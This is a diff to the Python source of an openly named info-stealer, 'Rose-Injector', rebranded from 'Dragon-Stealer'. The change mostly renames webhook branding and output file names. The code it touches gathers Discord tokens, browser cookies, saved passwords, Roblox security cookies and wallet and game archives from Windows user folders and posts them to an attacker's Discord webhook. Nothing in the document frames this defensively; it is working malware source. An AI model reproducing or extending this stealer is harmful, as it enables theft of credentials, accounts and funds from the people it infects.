@@ -67,9 +67,10 @@ local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 Threadlist = []
-footer = "Rose-Injector modified by [Gum](https://discord.com/users/1075072806892621874/), [pierro](https://discord.com/users/951401018065846372/) and [Websi](https://discord.com/users/716729476876206160/) | [GitHub](https://github.com/Gumbobrot/) | [Rose-Injector](https://github.com/Gum-s/Rose-Injector/)"
-avatar = "https://i.imgur.com/EZFAJXh.png"
-color = 16711680
+eb_footer = "Rose-Injector modified by [Gum](https://discord.com/users/1075072806892621874/), [pierro](https://discord.com/users/951401018065846372/) and [Websi](https://discord.com/users/716729476876206160/) | [GitHub](https://github.com/Gumbobrot/) | [Rose-Injector](https://github.com/Gum-s/Rose-Injector/)"
+eb_color = 16711680
+wh_avatar = "https://i.imgur.com/EZFAJXh.png"
+wh_name = "Rose-Injector"
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
@@ -132,7 +133,7 @@ def LoadUrlib(hook, data="", files="", headers=""):
             return r
 
 
-payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": "Dragon-Stealer", "avatar_url": avatar}
+payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
 response = requests.post(hook, json=payload)
 
 
@@ -439,7 +440,7 @@ class Discord(): #Updating soon
             "",
             "embeds": [{
                 "color":
-                color,
+                eb_color,
                 "fields": [
                     {
                         "name": ":tickets:   -   Token:",
@@ -481,7 +482,7 @@ class Discord(): #Updating soon
                     "icon_url": f"{pfp}",
                 },
                 "footer": {
-                    "text": footer,
+                    "text": eb_footer,
                     "icon_url": "",
                 },
                 "thumbnail": {
@@ -489,9 +490,9 @@ class Discord(): #Updating soon
                 },
             }],
             "avatar_url":
-            avatar,
+            wh_avatar,
             "username":
-            "Dragon-Stealer",
+            wh_name,
             "attachments": [],
         }
         # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -526,19 +527,19 @@ def upload(name, link):
             "content":
             "",
             "embeds": [{
-                "title": "Dragon  -  Cookie Grabber",
+                "title": f"{wh_name}  -  Cookie Grabber",
                 "description":
-                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[DragonCookies.txt]({link})",
-                "color": color,
+                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[RoseCookies.txt]({link})",
+                "color": eb_color,
                 "footer": {
-                    "text": footer,
+                    "text": eb_footer,
                     "icon_url": "",
                 },
             }],
             "username":
-            "Dragon-Stealer",
+            wh_name,
             "avatar_url":
-            avatar,
+            wh_avatar,
             "attachments": [],
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -554,19 +555,19 @@ def upload(name, link):
             "content":
             "",
             "embeds": [{
-                "title": "Dragon  -  Password Grabber",
+                "title": f"{wh_name}  -  Password Grabber",
                 "description":
-                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[DragonPasswords.txt]({link})",
-                "color": color,
+                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[RosePasswords.txt]({link})",
+                "color": eb_color,
                 "footer": {
-                    "text": footer,
+                    "text": eb_footer,
                     "icon_url": "",
                 },
             }],
             "username":
-            "Dragon-Stealer",
+            wh_name,
             "avatar_url":
-            avatar,
+            wh_avatar,
             "attachments": [],
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -730,9 +731,9 @@ def RobloxCookie(path, arg):
     shutil.copy2(pathC, tempfold)
     os.remove(tempfold)
     roblox_cookie = ""
-    with open(os.path.join(pathC, "Cookies", "DragonRobloxCookies.txt"), 'w', encoding="utf-8") as f:
-        f.write(f"{footer}\n\n")
-        with open(os.path.join(pathC, "Cookies", "DragonCookies.txt"), 'r', encoding="utf-8") as f2:
+    with open(os.path.join(pathC, "Cookies", "RoseRobloxCookies.txt"), 'w', encoding="utf-8") as f:
+        f.write(f"{eb_footer}\n\n")
+        with open(os.path.join(pathC, "Cookies", "RoseCookies.txt"), 'r', encoding="utf-8") as f2:
             try:
                 for line in f2:
                     if ".ROBLOSECURITY" in line:
@@ -752,8 +753,8 @@ def UploadRobloxCookie(hook):
         "",
         "embeds": [{
             "color":
-            color,
-            "title": "Dragon  -  Roblox Cookie Grabber",
+            eb_color,
+            "title": f"{wh_name}  -  Roblox Cookie Grabber",
             "fields": [
                 {
                     "name": "<:roblox_icon:1041819334969937931> Name:",
@@ -771,14 +772,14 @@ def UploadRobloxCookie(hook):
                 },
             ],
             "footer": {
-                "text": footer,
+                "text": eb_footer,
                 "icon_url": "",
             },
         }],
         "avatar_url":
-        avatar,
+        wh_avatar,
         "username":
-        "Dragon-Stealer",
+        wh_name,
         "attachments": [],
     }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -869,18 +870,18 @@ def GatherZips(paths1, paths2, paths3):
         "content":
         "",
         "embeds": [{
-            "title": "Dragon  -  Zips",
+            "title": f"{wh_name}  -  Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": color,
+            "color": eb_color,
             "footer": {
-                "text": footer,
+                "text": eb_footer,
                 "icon_url": "",
             },
         }],
         "username":
-        "Dragon-Stealer",
+        wh_name,
         "avatar_url":
-        avatar,
+        wh_avatar,
         "attachments": [],
     }
 
@@ -1357,11 +1358,15 @@ name = (str(subprocess.check_output("wmic csproduct get name"),
 
 embed = {
     "title":
-    "Dragon  -  Extras",
+    f"{wh_name}  -  Extras",
     "description":
     "Extra Information.",
     "color":
-    color,
+    eb_color,
+    "avatar":
+    wh_avatar,
+    "username":
+    wh_name,
     "fields": [
         {
             "name": "User",
